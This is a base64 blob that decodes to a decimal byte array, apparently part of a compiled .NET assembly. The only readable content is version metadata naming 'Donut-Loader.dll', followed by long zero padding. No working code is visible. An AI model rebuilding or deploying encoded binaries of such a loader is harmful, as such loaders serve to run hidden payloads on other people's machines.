IDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNTIsIDAsIDk4LCAwLCA0OCwgMCwgMCwgMCwgNjgsIDAsIDEzLCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNjgsIDAsIDEwMSwgMCwgMTE1LCAwLCA5OSwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMiwgMCwgMTE2LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTExLCAwLCAxMTAsIDAsIDExNywgMCwgMTE2LCAwLCA0NSwgMCwgNzYsIDAsIDExMSwgMCwgOTcsIDAsIDEwMCwgMCwgMTAxLCAwLCAxMTQsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAxNSwgMCwgMSwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDUwLCAwLCA0OCwgMCwgNTUsIDAsIDQ2LCAwLCA1MCwgMCwgNDgsIDAsIDUzLCAwLCA0OCwgMCwgNTYsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAxNywgMCwgMSwgMCwgNzMsIDAsIDExMCwgMCwgMTE2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3OCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCA2OCwgMCwgMTExLCAwLCAxMTAsIDAsIDExNywgMCwgMTE2LCAwLCA0NSwgMCwgNzYsIDAsIDExMSwgMCwgOTcsIDAsIDEwMCwgMCwgMTAxLCAwLCAxMTQsIDAsIDQ2LCAwLCAxMDAsIDAsIDEwOCwgMCwgMTA4LCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDc2LCAwLCAxMDEsIDAsIDEwMywgMCwgOTcsIDAsIDEwOCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAwLCAwLCA2NywgMCwgMTExLCAwLCAxMTIsIDAsIDEyMSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA0LCAwLCAxMTYsIDAsIDMyLCAwLCA1MCwgMCwgNDgsIDAsIDQ5LCAwLCA1NywgMCwgMCwgMCwgMCwgMCwgNzYsIDAsIDE3LCAwLCAxLCAwLCA3OSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA1LCAwLCAxMTAsIDAsIDk3LCAwLCAxMDgsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCAxMTAsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgNjgsIDAsIDExMSwgMCwgMTEwLCAwLCAxMTcsIDAsIDExNiwgMCwgNDUsIDAsIDc2LCAwLCAxMTEsIDAsIDk3LCAwLCAxMDAsIDAsIDEwMSwgMCwgMTE0LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgMCwgMCwgNjAsIDAsIDEzLCAwLCAxLCAwLCA4MCwgMCwgMTE0LCAwLCAxMTEsIDAsIDEwMCwgMCwgMTE3LCAwLCA5OSwgMCwgMTE2LCAwLCA3OCwgMCwgOTcsIDAsIDEwOSwgMCwgMTAxLCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMTExLCAwLCAxMTAsIDAsIDExNywgMCwgMTE2LCAwLCA0NSwgMCwgNzYsIDAsIDExMSwgMCwgOTcsIDAsIDEwMCwgMCwgMTAxLCAwLCAxMTQsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAxNSwgMCwgMSwgMCwgODAsIDAsIDExNCwgMCwgMTExLCAwLCAxMDAsIDAsIDExNywgMCwgOTksIDAsIDExNiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNTAsIDAsIDQ4LCAwLCA1NSwgMCwgNDYsIDAsIDUwLCAwLCA0OCwgMCwgNTMsIDAsIDQ4LCAwLCA1NiwgMCwgMCwgMCwgMCwgMCwgNzIsIDAsIDE1LCAwLCAxLCAwLCA2NSwgMCwgMTE1LCAwLCAxMTUsIDAsIDEwMSwgMCwgMTA5LCAwLCA5OCwgMCwgMTA4LCAwLCAxMjEsIDAsIDMyLCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA1MCwgMCwgNDgsIDAsIDU1LCAwLCA0NiwgMCwgNTAsIDAsIDQ4LCAwLCA1MywgMCwgNDgsIDAsIDU2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAw